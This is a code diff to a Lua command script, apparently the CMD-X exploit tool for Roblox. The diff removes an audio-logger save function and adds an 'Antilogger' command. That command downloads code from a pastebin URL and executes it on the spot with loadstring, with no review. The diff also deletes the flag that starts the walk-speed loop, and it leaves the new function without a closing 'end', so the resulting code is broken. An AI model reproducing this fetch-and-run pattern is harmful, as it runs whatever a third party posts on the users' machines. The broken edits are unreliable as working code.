@@ -4474,7 +4474,6 @@ function useCommand.bodypositionwalkspeed()
 	rocket.Name = "rocket"
 	local upvalue = 0
 	rocket.maxForce = Vector3.new(12500,12500,12500)
-	bodyPos = true
 	opx("-","BodyPositionWalkSpeed activated")
 	while bodyPos == true do
 		wait()
@@ -9897,14 +9896,12 @@ function useCommand.audiologger()
 	until audioLogger == false
 end
 
-function useCommand.audiologgersave()
-	opx("-","Audio logger stopped, file saved in workspace")
-	audioLogger = false
-	local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-	local filename = GetName.Name.." audiolog"..math.random(1,10000)
-	audioIds = game:GetService("HttpService"):JSONEncode(s)
-	writefile(filename..".CMD-X", audioIds)
-end
+function useCommand.Antilogger()
+	opx("-","Anti Logger, By Lunar")
+	loadstring(game:HttpGet(('https://pastebin.com/raw/DsJ170Bz'),true))()
+
+
+
 
 function useCommand.antilag()
 	Confirm("Default","This command is not reversable.")
